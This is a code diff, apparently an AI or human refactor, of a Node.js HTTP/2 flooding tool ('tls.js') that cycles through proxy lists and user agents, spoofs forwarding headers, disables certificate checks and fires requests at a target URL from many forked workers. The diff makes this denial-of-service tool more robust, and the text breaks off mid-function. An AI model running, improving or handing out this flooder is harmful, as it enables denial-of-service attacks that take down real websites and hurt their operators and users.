@@ -5,14 +5,18 @@ const cluster = require('cluster');
 const url = require('url');
 const crypto = require('crypto');
 const fs = require('fs');
+const path = require('path');
 
 process.setMaxListeners(0);
 require('events').EventEmitter.defaultMaxListeners = 0;
 
 if (process.argv.length < 5) {
-    console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 1000 300 20`);
-    process.exit();
+    console.error(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 1000 300 20`);
+    process.exit(1);
 }
+
+const [,, targetUrl, time, reqPerSec, threads] = process.argv;
+const parsedTarget = url.parse(targetUrl);
 
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
 const ciphers = 'GREASE:' + [
@@ -43,7 +47,6 @@ const secureOptions =
     crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 
 const secureProtocol = 'TLS_client_method';
-const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
@@ -55,25 +58,34 @@ const secureContextOptions = {
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 
-var proxyFile = 'proxy.txt';
-var proxies = readLines(proxyFile);
-var userAgents = readLines('ua.txt');
+const proxyFile = path.resolve(__dirname, 'proxy.txt');
+const uaFile = path.resolve(__dirname, 'ua.txt');
+
+const proxies = readLines(proxyFile);
+const userAgents = readLines(uaFile);
 
 const args = {
-    target: process.argv[2],
-    time: ~~process.argv[3],
-    rate: ~~process.argv[4],
-    threads: ~~process.argv[5],
+    target: targetUrl,
+    time: parseInt(time, 10),
+    rate: parseInt(reqPerSec, 10),
+    threads: parseInt(threads, 10),
 };
 
-const parsedTarget = url.parse(args.target);
+if (isNaN(args.time) || isNaN(args.rate) || isNaN(args.threads) || args.threads <= 0) {
+    console.error('Invalid arguments. TIME, REQ_PER_SEC, and THREADS must be positive integers.');
+    process.exit(1);
+}
 
 if (cluster.isMaster) {
-    for (let counter = 1; counter <= args.threads; counter++) {
+    for (let i = 0; i < args.threads; i++) {
         cluster.fork();
     }
+
+    cluster.on('exit', (worker, code, signal) => {
+        console.log(`Worker ${worker.process.pid} died with code: ${code}, signal: ${signal}`);
+    });
 } else {
-    setInterval(runFlooder, 1000 / args.rate); // Attack rate based on user input
+    setInterval(runFlooder, 1000 / args.rate);
 }
 
 class NetSocket {
@@ -82,7 +94,7 @@ class NetSocket {
     HTTP(options, callback) {
         const parsedAddr = options.address.split(':');
         const addrHost = parsedAddr[0];
-        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`; // Keep Alive
+        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
         const buffer = Buffer.from(payload);
 
         const connection = net.connect({
@@ -118,7 +130,7 @@ class NetSocket {
 
         connection.on('error', (error) => {
             connection.destroy();
-            return callback(undefined, 'error: ' + error);
+            return callback(undefined, `error: ${error.message}`);
         });
     }
 }
@@ -126,7 +138,12 @@ class NetSocket {
 const Socker = new NetSocket();
 
 function readLines(filePath) {
-    return fs.readFileSync(filePath, 'utf-8').toString().split(/\r?\n/);
+    try {
+        return fs.readFileSync(filePath, 'utf-8').toString().split(/\r?\n/).filter(Boolean);
+    } catch (error) {
+        console.error(`Error reading file ${filePath}: ${error.message}`);
+        process.exit(1);
+    }
 }
 
 function randomIntn(min, max) {
@@ -138,7 +155,7 @@ function randomElement(elements) {
 }
 
 function randomCharacters(length) {
-    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; // Ensure characters is defined
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     let output = '';
     for (let count = 0; count < length; count++) {
         output += randomElement(characters);
@@ -146,39 +163,43 @@ function randomCharacters(length) {
     return output;
 }
 
-headers[':method'] = 'GET';
-headers[':path'] = parsedTarget.path;
-headers[':scheme'] = 'https';
-headers['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
-headers['accept-language'] = 'es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3';
-headers['accept-encoding'] = 'gzip, deflate, br';
-headers['x-forwarded-proto'] = 'https';
-headers['cache-control'] = 'no-cache, no-store,private, max-age=0, must-revalidate';
-headers['sec-ch-ua-mobile'] = randomElement(['?0', '?1']);
-headers['sec-ch-ua-platform'] = randomElement(['Android', 'iOS', 'Linux', 'macOS', 'Windows']);
-headers['sec-fetch-dest'] = 'document';
-headers['sec-fetch-mode'] = 'navigate';
-headers['sec-fetch-site'] = 'same-origin';
-headers['upgrade-insecure-requests'] = '1';
+const headers = {
+    ':method': 'GET',
+    ':path': parsedTarget.path,
+    ':scheme': 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'accept-language': 'es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3',
+    'accept-encoding': 'gzip, deflate, br',
+    'x-forwarded-proto': 'https',
+    'cache-control': 'no-cache, no-store,private, max-age=0, must-revalidate',
+    'sec-ch-ua-mobile': randomElement(['?0', '?1']),
+    'sec-ch-ua-platform': randomElement(['Android', 'iOS', 'Linux', 'macOS', 'Windows']),
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'upgrade-insecure-requests': '1',
+};
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(':');
 
-    /** headers dynamic */
     headers[':authority'] = parsedTarget.host;
     headers['user-agent'] = randomElement(userAgents);
     headers['x-forwarded-for'] = parsedProxy[0];
 
     const proxyOptions = {
         host: parsedProxy[0],
-        port: ~~parsedProxy[1],
+        port: parseInt(parsedProxy[1], 10),
         address: parsedTarget.host + ':443',
         timeout: 15,
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
-        if (error) return;
+        if (error) {
+            console.error(error);
+            return;
+        }
 
         connection.setKeepAlive(true, 60000);
         connection.setNoDelay(true);
@@ -200,7 +221,6 @@ function runFlooder() {
             honorCipherOrder: false,
             host: parsedTarget.host,
             rejectUnauthorized: false,
-            clientCertEngine: 'dynamic',
             secureOptions: secureOptions,
             secureContext: secureContext,
             servername: parsedTarget.host,
@@ -209,12 +229,25 @@ function runFlooder() {
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
 
-        tlsConn.allowHalfOpen = true;
-        tlsConn.setNoDelay(true);
-        tlsConn.setKeepAlive(true, 60 * 1000);
-        tlsConn.setMaxListeners(0);
+        tlsConn.on('secureConnect', () => {
+            const client = http2.connect(parsedTarget.href, {
+                protocol: 'https:',
+                settings: settings,
+                maxSession: 10000,
+            });
 
-        const client = http2.connect(parsedTarget.href, {
-            protocol: 'https:',
-            settings: settings,
-            maxSession
+            client.on('error', (err) => {
+                console.error('HTTP/2 Client Error:', err.message);
+            });
+
+            const request = client.request(headers);
+
+            request.on('response', (headers) => {
+                // Handle response headers if needed
+            });
+
+            request.on('data', (chunk) => {
+                // Handle response data if needed
+            });
+
+            request.on('end', () =>
